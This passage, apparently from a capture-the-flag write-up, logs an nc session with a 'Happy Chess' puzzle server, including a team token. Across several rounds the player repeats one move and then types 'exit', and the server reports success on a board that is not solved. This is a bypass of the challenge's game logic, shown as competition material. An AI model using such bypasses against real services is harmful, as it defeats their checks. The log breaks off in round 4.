class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br><span class="line">1113</span><br><span class="line">1114</span><br><span class="line">1115</span><br><span class="line">1116</span><br><span class="line">1117</span><br><span class="line">1118</span><br><span class="line">1119</span><br><span class="line">1120</span><br><span class="line">1121</span><br><span class="line">1122</span><br><span class="line">1123</span><br><span class="line">1124</span><br><span class="line">1125</span><br><span class="line">1126</span><br><span class="line">1127</span><br><span class="line">1128</span><br><span class="line">1129</span><br><span class="line">1130</span><br><span class="line">1131</span><br><span class="line">1132</span><br><span class="line">1133</span><br><span class="line">1134</span><br><span class="line">1135</span><br><span class="line">1136</span><br><span class="line">1137</span><br><span class="line">1138</span><br><span class="line">1139</span><br><span class="line">1140</span><br><span class="line">1141</span><br><span class="line">1142</span><br><span class="line">1143</span><br><span class="line">1144</span><br><span class="line">1145</span><br><span class="line">1146</span><br><span class="line">1147</span><br><span class="line">1148</span><br><span class="line">1149</span><br><span class="line">1150</span><br><span class="line">1151</span><br><span class="line">1152</span><br><span class="line">1153</span><br><span class="line">1154</span><br><span class="line">1155</span><br><span class="line">1156</span><br><span class="line">1157</span><br><span class="line">1158</span><br><span class="line">1159</span><br><span class="line">1160</span><br><span class="line">1161</span><br><span class="line">1162</span><br><span class="line">1163</span><br><span class="line">1164</span><br><span class="line">1165</span><br><span class="line">1166</span><br><span class="line">1167</span><br><span class="line">1168</span><br><span class="line">1169</span><br><span class="line">1170</span><br><span class="line">1171</span><br><span class="line">1172</span><br><span class="line">1173</span><br><span class="line">1174</span><br><span class="line">1175</span><br><span class="line">1176</span><br><span class="line">1177</span><br><span class="line">1178</span><br><span class="line">1179</span><br><span class="line">1180</span><br><span class="line">1181</span><br><span class="line">1182</span><br><span class="line">1183</span><br><span class="line">1184</span><br><span class="line">1185</span><br><span class="line">1186</span><br><span class="line">1187</span><br><span class="line">1188</span><br><span class="line">1189</span><br><span class="line">1190</span><br><span class="line">1191</span><br><span class="line">1192</span><br><span class="line">1193</span><br><span class="line">1194</span><br><span class="line">1195</span><br><span class="line">1196</span><br><span class="line">1197</span><br><span class="line">1198</span><br><span class="line">1199</span><br><span class="line">1200</span><br><span class="line">1201</span><br><span class="line">1202</span><br><span class="line">1203</span><br><span class="line">1204</span><br><span class="line">1205</span><br><span class="line">1206</span><br><span class="line">1207</span><br><span class="line">1208</span><br><span class="line">1209</span><br><span class="line">1210</span><br><span class="line">1211</span><br><span class="line">1212</span><br><span class="line">1213</span><br><span class="line">1214</span><br><span class="line">1215</span><br><span class="line">1216</span><br><span class="line">1217</span><br><span class="line">1218</span><br><span class="line">1219</span><br><span class="line">1220</span><br><span class="line">1221</span><br><span class="line">1222</span><br><span class="line">1223</span><br><span class="line">1224</span><br><span class="line">1225</span><br><span class="line">1226</span><br><span class="line">1227</span><br><span class="line">1228</span><br><span class="line">1229</span><br><span class="line">1230</span><br><span class="line">1231</span><br><span class="line">1232</span><br><span class="line">1233</span><br><span class="line">1234</span><br><span class="line">1235</span><br><span class="line">1236</span><br><span class="line">1237</span><br><span class="line">1238</span><br><span class="line">1239</span><br><span class="line">1240</span><br><span class="line">1241</span><br><span class="line">1242</span><br><span class="line">1243</span><br><span class="line">1244</span><br><span class="line">1245</span><br><span class="line">1246</span><br><span class="line">1247</span><br></pre></td><td class="code"><pre><code class="hljs python">nc <span class="hljs-number">47.104</span><span class="hljs-number">.199</span><span class="hljs-number">.71</span> <span class="hljs-number">10075</span><br>Team Token:<br>&gt; icq1f53668cd7a8a6cd934da51b6ac0f<br>Welcome to Happy Chess!<br><br>The rule <span class="hljs-keyword">is</span> to select a piece <span class="hljs-keyword">and</span> flip <span class="hljs-built_in">all</span> the pieces horizontally <span class="hljs-keyword">and</span> vertically ~<br>Your goal <span class="hljs-keyword">is</span> to change <span class="hljs-built_in">all</span> the pieces to the same color ~<br>You will play <span class="hljs-number">10</span> rounds of the game, <span class="hljs-keyword">and</span> you can get the flag <span class="hljs-keyword">if</span> your total number of moves <span class="hljs-keyword">is</span> no more than <span class="hljs-number">239</span> ~<br>If you fail <span class="hljs-keyword">in</span> a <span class="hljs-built_in">round</span>, it will be directly regarded <span class="hljs-keyword">as</span> using <span class="hljs-number">240</span> steps :)<br><br>Have fun ~<br><br><br>Round <span class="hljs-number">1</span>/<span class="hljs-number">10</span><br>○○○●●●●○○<br>○●○○○●●●○<br>●○○●○●○●○<br>○○●○○●○●●<br>○●●●●○○○○<br>○○●●●●●●○<br>○○●●○○●●○<br>○○●●○●○●○<br>●○●○●○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●●○○○○●●<br>●●○○○●●●○<br>○○○●○●○●○<br>●○●○○●○●●<br>●●●●●○○○○<br>●○●●●●●●○<br>●○●●○○●●○<br>●○●●○●○●○<br>○○●○●○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○○●●●●○○<br>○●○○○●●●○<br>●○○●○●○●○<br>○○●○○●○●●<br>○●●●●○○○○<br>○○●●●●●●○<br>○○●●○○●●○<br>○○●●○●○●○<br>●○●○●○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●●○○○○●●<br>●●○○○●●●○<br>○○○●○●○●○<br>●○●○○●○●●<br>●●●●●○○○○<br>●○●●●●●●○<br>●○●●○○●●○<br>●○●●○●○●○<br>○○●○●○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○○●●●●○○<br>○●○○○●●●○<br>●○○●○●○●○<br>○○●○○●○●●<br>○●●●●○○○○<br>○○●●●●●●○<br>○○●●○○●●○<br>○○●●○●○●○<br>●○●○●○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●●○○○○●●<br>●●○○○●●●○<br>○○○●○●○●○<br>●○●○○●○●●<br>●●●●●○○○○<br>●○●●●●●●○<br>●○●●○○●●○<br>●○●●○●○●○<br>○○●○●○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○○●●●●○○<br>○●○○○●●●○<br>●○○●○●○●○<br>○○●○○●○●●<br>○●●●●○○○○<br>○○●●●●●●○<br>○○●●○○●●○<br>○○●●○●○●○<br>●○●○●○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●●○○○○●●<br>●●○○○●●●○<br>○○○●○●○●○<br>●○●○○●○●●<br>●●●●●○○○○<br>●○●●●●●●○<br>●○●●○○●●○<br>●○●●○●○●○<br>○○●○●○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○○●●●●○○<br>○●○○○●●●○<br>●○○●○●○●○<br>○○●○○●○●●<br>○●●●●○○○○<br>○○●●●●●●○<br>○○●●○○●●○<br>○○●●○●○●○<br>●○●○●○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●●○○○○●●<br>●●○○○●●●○<br>○○○●○●○●○<br>●○●○○●○●●<br>●●●●●○○○○<br>●○●●●●●●○<br>●○●●○○●●○<br>●○●●○●○●○<br>○○●○●○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○○●●●●○○<br>○●○○○●●●○<br>●○○●○●○●○<br>○○●○○●○●●<br>○●●●●○○○○<br>○○●●●●●●○<br>○○●●○○●●○<br>○○●●○●○●○<br>●○●○●○○○●<br><br>&gt; exit<br>Success ~ <span class="hljs-number">10</span> step(s).<br>&gt; <br>Round <span class="hljs-number">2</span>/<span class="hljs-number">10</span><br>●●○○○○●○●<br>●●○○●○○○●<br>○○○●○○○○●<br>○○○●●○○●●<br>●●○○●●○○○<br>●●○○●●●●○<br>○●●○○●○○●<br>○○●○○●○○○<br>○●○○○○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○●●●●○●○<br>○●○○●○○○●<br>●○○●○○○○●<br>●○○●●○○●●<br>○●○○●●○○○<br>○●○○●●●●○<br>●●●○○●○○●<br>●○●○○●○○○<br>●●○○○○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●○○○○●○●<br>●●○○●○○○●<br>○○○●○○○○●<br>○○○●●○○●●<br>●●○○●●○○○<br>●●○○●●●●○<br>○●●○○●○○●<br>○○●○○●○○○<br>○●○○○○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○●●●●○●○<br>○●○○●○○○●<br>●○○●○○○○●<br>●○○●●○○●●<br>○●○○●●○○○<br>○●○○●●●●○<br>●●●○○●○○●<br>●○●○○●○○○<br>●●○○○○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●○○○○●○●<br>●●○○●○○○●<br>○○○●○○○○●<br>○○○●●○○●●<br>●●○○●●○○○<br>●●○○●●●●○<br>○●●○○●○○●<br>○○●○○●○○○<br>○●○○○○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○●●●●○●○<br>○●○○●○○○●<br>●○○●○○○○●<br>●○○●●○○●●<br>○●○○●●○○○<br>○●○○●●●●○<br>●●●○○●○○●<br>●○●○○●○○○<br>●●○○○○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●○○○○●○●<br>●●○○●○○○●<br>○○○●○○○○●<br>○○○●●○○●●<br>●●○○●●○○○<br>●●○○●●●●○<br>○●●○○●○○●<br>○○●○○●○○○<br>○●○○○○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○●●●●○●○<br>○●○○●○○○●<br>●○○●○○○○●<br>●○○●●○○●●<br>○●○○●●○○○<br>○●○○●●●●○<br>●●●○○●○○●<br>●○●○○●○○○<br>●●○○○○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●○○○○●○●<br>●●○○●○○○●<br>○○○●○○○○●<br>○○○●●○○●●<br>●●○○●●○○○<br>●●○○●●●●○<br>○●●○○●○○●<br>○○●○○●○○○<br>○●○○○○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○●●●●○●○<br>○●○○●○○○●<br>●○○●○○○○●<br>●○○●●○○●●<br>○●○○●●○○○<br>○●○○●●●●○<br>●●●○○●○○●<br>●○●○○●○○○<br>●●○○○○○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●○○○○●○●<br>●●○○●○○○●<br>○○○●○○○○●<br>○○○●●○○●●<br>●●○○●●○○○<br>●●○○●●●●○<br>○●●○○●○○●<br>○○●○○●○○○<br>○●○○○○○○●<br><br>&gt; exit<br>Success ~ <span class="hljs-number">10</span> step(s).<br>&gt; <br>Round <span class="hljs-number">3</span>/<span class="hljs-number">10</span><br>○○●●●●●●○<br>●●●●○○○●●<br>○○●○●○●●○<br>○●○○●●○●○<br>○○○○○●○○●<br>○○●●○○●○●<br>○○○○●○○○●<br>●●○○●●○○○<br>○●○●●○●○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●○○○○○○●<br>○●●●○○○●●<br>●○●○●○●●○<br>●●○○●●○●○<br>●○○○○●○○●<br>●○●●○○●○●<br>●○○○●○○○●<br>○●○○●●○○○<br>●●○●●○●○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○●●●●●●○<br>●●●●○○○●●<br>○○●○●○●●○<br>○●○○●●○●○<br>○○○○○●○○●<br>○○●●○○●○●<br>○○○○●○○○●<br>●●○○●●○○○<br>○●○●●○●○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●○○○○○○●<br>○●●●○○○●●<br>●○●○●○●●○<br>●●○○●●○●○<br>●○○○○●○○●<br>●○●●○○●○●<br>●○○○●○○○●<br>○●○○●●○○○<br>●●○●●○●○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○●●●●●●○<br>●●●●○○○●●<br>○○●○●○●●○<br>○●○○●●○●○<br>○○○○○●○○●<br>○○●●○○●○●<br>○○○○●○○○●<br>●●○○●●○○○<br>○●○●●○●○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●○○○○○○●<br>○●●●○○○●●<br>●○●○●○●●○<br>●●○○●●○●○<br>●○○○○●○○●<br>●○●●○○●○●<br>●○○○●○○○●<br>○●○○●●○○○<br>●●○●●○●○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○●●●●●●○<br>●●●●○○○●●<br>○○●○●○●●○<br>○●○○●●○●○<br>○○○○○●○○●<br>○○●●○○●○●<br>○○○○●○○○●<br>●●○○●●○○○<br>○●○●●○●○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●○○○○○○●<br>○●●●○○○●●<br>●○●○●○●●○<br>●●○○●●○●○<br>●○○○○●○○●<br>●○●●○○●○●<br>●○○○●○○○●<br>○●○○●●○○○<br>●●○●●○●○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○●●●●●●○<br>●●●●○○○●●<br>○○●○●○●●○<br>○●○○●●○●○<br>○○○○○●○○●<br>○○●●○○●○●<br>○○○○●○○○●<br>●●○○●●○○○<br>○●○●●○●○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●○○○○○○●<br>○●●●○○○●●<br>●○●○●○●●○<br>●●○○●●○●○<br>●○○○○●○○●<br>●○●●○○●○●<br>●○○○●○○○●<br>○●○○●●○○○<br>●●○●●○●○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○●●●●●●○<br>●●●●○○○●●<br>○○●○●○●●○<br>○●○○●●○●○<br>○○○○○●○○●<br>○○●●○○●○●<br>○○○○●○○○●<br>●●○○●●○○○<br>○●○●●○●○○<br><br>&gt; exit<br>Success ~ <span class="hljs-number">10</span> step(s).<br>&gt; <br>Round <span class="hljs-number">4</span>/<span class="hljs-number">10</span><br>○○○●●●●●●<br>○○●●○●●○○<br>○○○●○●●●○<br>●●●○●●●○○<br>●●●○○●●○●<br>○●○●○●●○○<br>○○○○●○○●○<br>○●●○○●●●●<br>○○○○●●●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●●○○○○○○<br>●○●●○●●○○<br>●○○●○●●●○<br>○●●○●●●○○<br>○●●○○●●○●<br>●●○●○●●○○<br>●○○○●○○●○<br>●●●○○●●●●<br>●○○○●●●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○○●●●●●●<br>○○●●○●●○○<br>○○○●○●●●○<br>●●●○●●●○○<br>●●●○○●●○●<br>○●○●○●●○○<br>○○○○●○○●○<br>○●●○○●●●●<br>○○○○●●●○●<br><br>&gt; <span class="hljs-number">1</span> <span 